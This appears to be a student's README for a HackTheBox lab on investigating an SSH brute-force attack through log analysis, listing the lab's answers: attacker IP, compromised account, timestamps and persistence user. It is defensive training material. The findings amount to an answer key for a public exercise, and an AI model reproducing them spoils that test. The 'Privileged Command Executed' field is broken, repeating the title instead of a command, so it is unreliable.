# Project 4 — Brutus Lab (SSH Brute Force Analysis)

This repository contains my work for the **Brutus Lab** from HackTheBox as part of my cybersecurity internship.  
The lab focused on investigating and analyzing a brute force SSH attack scenario.  

---

## 🔍 Objectives
- Analyze `auth.log` and `wtmp` to trace brute force attempts.  
- Identify attacker’s IP and the account compromised.  
- Investigate persistence strategy through new user creation.  
- Track attacker’s SSH session activity.  
- Report findings and mitigation steps.

---

## 📑 Key Findings
- Attacker IP: **65.2.161.68**  
- Compromised Account: **root**  
- Attacker Login Time (UTC): **2024-03-06 06:32:45**  
- Session Number: **37**  
- Persistence User: **cyberjunkie**  
- MITRE ATT&CK ID: **T1136.001**  
- Attacker Session Ended: **2024-03-06 06:37:24**  
- Privileged Command Executed:  # Project 4 — Brutus Lab (SSH Brute Force Analysis)

## 🚀 Learning Outcomes
- Hands-on experience analyzing brute force SSH attacks.  
- Improved skills in log analysis and attacker persistence detection.  
- Mapped attacker behavior to **MITRE ATT&CK framework**.  

---

## 📌 Next Steps
- Apply similar detection techniques in SIEM (Splunk/ELK).  
- Continue with upcoming internship projects.
